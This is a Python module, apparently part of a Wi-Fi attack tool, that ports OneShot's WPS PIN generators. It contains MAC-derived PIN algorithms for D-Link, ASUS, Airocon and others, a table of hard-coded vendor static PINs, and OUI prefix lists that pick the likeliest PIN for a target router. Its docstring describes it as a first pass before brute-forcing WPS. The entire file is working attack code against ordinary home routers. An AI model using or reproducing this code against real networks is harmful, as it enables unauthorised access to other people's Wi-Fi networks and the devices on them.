"""MAC-based WPS PIN generators ported from OneShot.

OneShot (https://github.com/drygdryg/OneShot) implements a large collection
of vendor-specific PIN derivation algorithms. They are useful as a first
pass before bruteforce and are kept here as a separate module so the
wpa_supplicant-backed WPS path can use them without pulling in the full
native/scapy state machine.
"""

from __future__ import annotations


class NetworkAddress:
    """Simple MAC address helper: string <-> integer conversion."""

    def __init__(self, mac: str | int):
        if isinstance(mac, int):
            self._int = mac & 0xFFFFFFFFFFFF
            self._str = self._int2mac(self._int)
        elif isinstance(mac, str):
            self._str = mac.replace("-", ":").replace(".", ":").upper()
            self._int = int(self._str.replace(":", ""), 16)
        else:
            raise ValueError("MAC address must be string or integer")

    @property
    def string(self) -> str:
        return self._str

    @property
    def integer(self) -> int:
        return self._int

    def __int__(self) -> int:
        return self._int

    def __str__(self) -> str:
        return self._str

    def __iadd__(self, other: int) -> "NetworkAddress":
        self._int = (self._int + other) & 0xFFFFFFFFFFFF
        self._str = self._int2mac(self._int)
        return self

    @staticmethod
    def _int2mac(mac: int) -> str:
        mac = hex(mac)[2:].upper().zfill(12)
        return ":".join(mac[i : i + 2] for i in range(0, 12, 2))


def pin_checksum(first7: int) -> int:
    """Standard WPS checksum for a 7-digit (0-9999999) PIN core."""
    accum = 0
    pin = first7
    while pin:
        accum += 3 * (pin % 10)
        pin //= 10
        accum += pin % 10
        pin //= 10
    return (10 - accum % 10) % 10


def _pin24(mac: NetworkAddress) -> int:
    return mac.integer & 0xFFFFFF


def _pin28(mac: NetworkAddress) -> int:
    return mac.integer & 0xFFFFFFF


def _pin32(mac: NetworkAddress) -> int:
    return mac.integer & 0xFFFFFFFF


def _pin_dlink(mac: NetworkAddress) -> int:
    nic = mac.integer & 0xFFFFFF
    pin = nic ^ 0x55AA55
    pin ^= (
        ((pin & 0xF) << 4)
        + ((pin & 0xF) << 8)
        + ((pin & 0xF) << 12)
        + ((pin & 0xF) << 16)
        + ((pin & 0xF) << 20)
    )
    pin %= 10_000_000
    if pin < 1_000_000:
        pin += ((pin % 9) * 1_000_000) + 1_000_000
    return pin


def _pin_dlink1(mac: NetworkAddress) -> int:
    mac += 1
    return _pin_dlink(mac)


def _pin_asus(mac: NetworkAddress) -> int:
    b = [int(i, 16) for i in mac.string.split(":")]
    pin = ""
    for i in range(7):
        mod = 10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7
        pin += str((b[i % 6] + b[5]) % mod)
    return int(pin)


def _pin_airocon(mac: NetworkAddress) -> int:
    b = [int(i, 16) for i in mac.string.split(":")]
    return (
        ((b[0] + b[1]) % 10)
        + (((b[5] + b[0]) % 10) * 10)
        + (((b[4] + b[5]) % 10) * 100)
        + (((b[3] + b[4]) % 10) * 1000)
        + (((b[2] + b[3]) % 10) * 10000)
        + (((b[1] + b[2]) % 10) * 100000)
        + (((b[0] + b[1]) % 10) * 1000000)
    )


class WPSpin:
    """OneShot-style WPS PIN generator.

    Algorithms are keyed by ID (e.g. ``'pin24'``, ``'pinDLink'``) and each
    returns an 8-digit PIN string including checksum.
    """

    ALGO_MAC = 0
    ALGO_EMPTY = 1
    ALGO_STATIC = 2

    STATIC_PINS: dict[str, int] = {
        "pinCisco": 1234567,
        "pinBrcm1": 2017252,
        "pinBrcm2": 4626484,
        "pinBrcm3": 7622990,
        "pinBrcm4": 6232714,
        "pinBrcm5": 1086411,
        "pinBrcm6": 3195719,
        "pinAirc1": 3043203,
        "pinAirc2": 7141225,
        "pinDSL2740R": 6817554,
        "pinRealtek1": 9566146,
        "pinRealtek2": 9571911,
        "pinRealtek3": 4856371,
        "pinUpvel": 2085483,
        "pinUR814AC": 4397768,
        "pinUR825AC": 529417,
        "pinOnlime": 9995604,
        "pinEdimax": 3561153,
        "pinThomson": 6795814,
        "pinHG532x": 3425928,
        "pinH108L": 9422988,
        "pinONO": 9575521,
    }

    MAC_ALGOS: dict[str, tuple[str, callable]] = {
        "pin24": ("24-bit PIN", _pin24),
        "pin28": ("28-bit PIN", _pin28),
        "pin32": ("32-bit PIN", _pin32),
        "pinDLink": ("D-Link PIN", _pin_dlink),
        "pinDLink1": ("D-Link PIN +1", _pin_dlink1),
        "pinASUS": ("ASUS PIN", _pin_asus),
        "pinAirocon": ("Airocon Realtek", _pin_airocon),
    }

    # MAC OUI masks that select a given algorithm. Ported from OneShot.
    SUGGESTIONS: dict[str, tuple[str, ...]] = {
        "pin24": (
            "04BF6D", "0E5D4E", "107BEF", "14A9E3", "28285D", "2A285D",
            "32B2DC", "381766", "404A03", "4E5D4E", "5067F0", "5CF4AB",
            "6A285D", "8E5D4E", "AA285D", "B0B2DC", "C86C87", "CC5D4E",
            "CE5D4E", "EA285D", "E243F6", "EC43F6", "EE43F6", "F2B2DC",
            "FCF528", "FEF528", "4C9EFF", "0014D1", "D8EB97", "1C7EE5",
            "84C9B2", "FC7516", "14D64D", "9094E4", "BCF685", "C4A81D",
            "00664B", "087A4C", "14B968", "2008ED", "346BD3", "4CEDDE",
            "786A89", "88E3AB", "D46E5C", "E8CD2D", "EC233D", "ECCB30",
            "F49FF3", "20CF30", "90E6BA", "E0CB4E", "D4BF7F4", "F8C091",
            "001CDF", "002275", "08863B", "00B00C", "081075", "C83A35",
            "0022F7", "001F1F", "00265B", "68B6CF", "788DF7", "BC1401",
            "202BC1", "308730", "5C4CA9", "62233D", "623CE4", "623DFF",
            "6253D4", "62559C", "626BD3", "627D5E", "6296BF", "62A8E4",
            "62B686", "62C06F", "62C61F", "62C714", "62CBA8", "62CDBE",
            "62E87B", "6416F0", "6A1D67", "6A233D", "6A3DFF", "6A53D4",
            "6A559C", "6A6BD3", "6A96BF", "6A7D5E", "6AA8E4", "6AC06F",
            "6AC61F", "6AC714", "6ACBA8", "6ACDBE", "6AD15E", "6AD167",
            "721D67", "72233D", "723CE4", "723DFF", "7253D4", "72559C",
            "726BD3", "727D5E", "7296BF", "72A8E4", "72C06F", "72C61F",
            "72C714", "72CBA8", "72CDBE", "72D15E", "72E87B", "0026CE",
            "9897D1", "E04136", "B246FC", "E24136", "00E020", "5CA39D",
            "D86CE9", "DC7144", "801F02", "E47CF9", "000CF6", "00A026",
            "A0F3C1", "647002", "B0487A", "F81A67", "F8D111", "34BA9A",
            "B4944E",
        ),
        "pin28": ("200BC7", "4846FB", "D46AA8", "F84ABF"),
        "pin32": (
            "000726", "D8FEE3", "FC8B97", "1062EB", "1C5F2B", "48EE0C",
            "802689", "908D78", "E8CC18", "2CAB25", "10BF48", "14DAE9",
            "3085A9", "50465D", "5404A6", "C86000", "F46D04",
        ),
        "pinDLink": (
            "14D64D", "1C7EE5", "28107B", "84C9B2", "A0AB1B", "B8A386",
            "C0A0BB", "CCB255", "FC7516", "0014D1", "D8EB97",
        ),
        "pinDLink1": (
            "0018E7", "00195B", "001CF0", "001E58", "002191", "0022B0",
            "002401", "00265A", "14D64D", "1C7EE5", "340804", "5CD998",
            "84C9B2", "B8A386", "C8BE19", "C8D3A3", "CCB255", "0014D1",
        ),
        "pinASUS": (
            "049226", "04D9F5", "08606E", "0862669", "107B44", "10BF48",
            "10C37B", "14DDA9", "1C872C", "1CB72C", "2C56DC", "2CFDA1",
            "305A3A", "382C4A", "38D547", "40167E", "50465D", "54A050",
            "6045CB", "60A44C", "704D7B", "74D02B", "7824AF", "88D7F6",
            "9C5C8E", "AC220B", "AC9E17", "B06EBF", "BCEE7B", "C860007",
            "D017C2", "D850E6", "E03F49", "F0795978", "F832E4", "00072624",
            "0008A1D3", "00177C", "001EA6", "00304FB", "00E04C0", "048D38",
            "081077", "081078", "081079", "083E5D", "10FEED3C", "181E78",
            "1C4419", "2420C7", "247F20", "2CAB25", "3085A98C", "3C1E04",
            "40F201", "44E9DD", "48EE0C", "5464D9", "54B80A", "587BE906",
            "60D1AA21", "64517E", "64D954", "6C198F", "6C7220", "6CFDB9",
            "78D99FD", "7C2664", "803F5DF6", "84A423", "88A6C6", "8C10D4",
            "8C882B00", "904D4A", "907282", "90F65290", "94FBB2", "A01B29",
            "A0F3C1E", "A8F7E00", "ACA213", "B85510", "B8EE0E", "BC3400",
            "BC9680", "C891F9", "D00ED90", "D084B0", "D8FEE3", "E4BEED",
            "E894F6F6", "EC1A5971", "EC4C4D", "F42853", "F43E61", "F46BEF",
            "F8AB05", "FC8B97", "7062B8", "78542E", "C0A0BB8C", "C412F5",
            "C4A81D", "E8CC18", "EC2280", "F8E903F4",
        ),
        "pinAirocon": (
            "0007262F", "000B2B4A", "000EF4E7", "001333B", "00177C",
            "001AEF", "00E04BB3", "02101801", "0810734", "08107710",
            "1013EE0", "2CAB25C7", "788C54", "803F5DF6", "94FBB2",
            "BC9680", "F43E61", "FC8B97",
        ),
        "pinEmpty": (
            "E46F13", "EC2280", "58D56E", "1062EB", "10BEF5", "1C5F2B",
            "802689", "A0AB1B", "74DADA", "9CD643", "68A0F6", "0C96BF",
            "20F3A3", "ACE215", "C8D15E", "000E8F", "D42122", "3C9872",
            "788102", "7894B4", "D460E3", "E06066", "004A77", "2C957F",
            "64136C", "74A78E", "88D274", "702E22", "74B57E", "789682",
            "7C3953", "8C68C8", "D476EA", "344DEA", "38D82F", "54BE53",
            "709F2D", "94A7B7", "981333", "CAA366", "D0608C",
        ),
        "pinCisco": (
            "001A2B", "00248C", "002618", "344DEB", "7071BC", "E06995",
            "E0CB4E", "7054F5",
        ),
        "pinBrcm1": (
            "ACF1DF", "BCF685", "C8D3A3", "988B5D", "001AA9", "14144B",
            "EC6264",
        ),
        "pinBrcm2": (
            "14D64D", "1C7EE5", "28107B", "84C9B2", "B8A386", "BCF685",
            "C8BE19",
        ),
        "pinBrcm3": (
            "14D64D", "1C7EE5", "28107B", "B8A386", "BCF685", "C8BE19",
            "7C034C",
        ),
        "pinBrcm4": (
            "14D64D", "1C7EE5", "28107B", "84C9B2", "B8A386", "BCF685",
            "C8BE19", "C8D3A3", "CCB255", "FC7516", "204E7F", "4C17EB",
            "18622C", "7C03D8", "D86CE9",
        ),
        "pinBrcm5": (
            "14D64D", "1C7EE5", "28107B", "84C9B2", "B8A386", "BCF685",
            "C8BE19", "C8D3A3", "CCB255", "FC7516", "204E7F", "4C17EB",
            "18622C", "7C03D8", "D86CE9",
        ),
        "pinBrcm6": (
            "14D64D", "1C7EE5", "28107B", "84C9B2", "B8A386", "BCF685",
            "C8BE19", "C8D3A3", "CCB255", "FC7516", "204E7F", "4C17EB",
            "18622C", "7C03D8", "D86CE9",
        ),
        "pinAirc1": ("181E78", "40F201", "44E9DD", "D084B0"),
        "pinAirc2": ("84A423", "8C10D4", "88A6C6"),
        "pinDSL2740R": (
            "00265A", "1CBDB9", "340804", "5CD998", "84C9B2", "FC7516",
        ),
        "pinRealtek1": ("0014D1", "000C42", "000EE8"),
        "pinRealtek2": ("007263", "E4BEED"),
        "pinRealtek3": ("08C6B3",),
        "pinUpvel": ("784476", "D4BF7F0", "F8C091"),
        "pinUR814AC": ("D4BF7F60",),
        "pinUR825AC": ("D4BF7F5",),
        "pinOnlime": ("D4BF7F", "F8C091", "144D67", "784476", "0014D1"),
        "pinEdimax": ("801F02", "00E04C"),
        "pinThomson": ("002624", "4432C8", "88F7C7", "CC03FA"),
        "pinHG532x": (
            "00664B", "086361", "087A4C", "0C96BF", "14B968", "2008ED",
            "2469A5", "346BD3", "786A89", "88E3AB", "9CC172", "ACE215",
            "D07AB5", "CCA223", "E8CD2D", "F80113", "F83DFF",
        ),
        "pinH108L": (
            "4C09B4", "4CAC0A", "84742A4", "9CD24B", "B075D5", "C864C7",
            "DC028E", "FCC897",
        ),
        "pinONO": ("5C353B", "DC537C"),
    }

    def __init__(self):
        self.algos: dict[str, dict] = {}
        for algo_id, (name, gen) in self.MAC_ALGOS.items():
            self.algos[algo_id] = {"name": name, "mode": self.ALGO_MAC, "gen": gen}
        for algo_id, pin in self.STATIC_PINS.items():
            self.algos[algo_id] = {
                "name": algo_id.replace("pin", ""),
                "mode": self.ALGO_STATIC,
                "gen": lambda _mac, p=pin: p,
            }
        self.algos["pinEmpty"] = {
            "name": "Empty PIN",
            "mode": self.ALGO_EMPTY,
            "gen": lambda _mac: "",
        }

    def generate(self, algo: str, mac: str | int) -> str:
        """Generate an 8-digit PIN (with checksum) for ``algo`` and ``mac``."""
        if algo not in self.algos:
            raise ValueError(f"Invalid WPS PIN algorithm: {algo}")
        addr = NetworkAddress(mac)
        pin = self.algos[algo]["gen"](addr)
        if algo == "pinEmpty":
            return pin
        pin = int(pin) % 10_000_000
        return f"{pin:07d}{pin_checksum(pin)}"

    def get_all(self, mac: str | int, include_static: bool = True) -> list[dict]:
        """Return every known PIN for ``mac`` as ``[{id, name, pin}, ...]``."""
        res = []
        for algo_id, info in self.algos.items():
            if info["mode"] == self.ALGO_STATIC and not include_static:
                continue
            prefix = "Static PIN — " if info["mode"] == self.ALGO_STATIC else ""
            res.append(
                {
                    "id": algo_id,
                    "name": prefix + info["name"],
                    "pin": self.generate(algo_id, mac),
                }
            )
        return res

    def suggest(self, mac: str | int) -> list[str]:
        """Return algorithm IDs whose MAC masks match ``mac``."""
        addr = NetworkAddress(mac)
        oui = addr.string.replace(":", "")
        return [algo_id for algo_id, masks in self.SUGGESTIONS.items() if oui.startswith(masks)]

    def get_suggested(self, mac: str | int) -> list[dict]:
        """Return PIN entries for algorithms suggested by the MAC OUI."""
        return [
            {"id": algo_id, "name": self.algos[algo_id]["name"], "pin": self.generate(algo_id, mac)}
            for algo_id in self.suggest(mac)
        ]

    def get_likely(self, mac: str | int) -> str | None:
        """Return the single most likely PIN, or ``None``."""
        pins = [entry["pin"] for entry in self.get_suggested(mac)]
        return pins[0] if pins else None
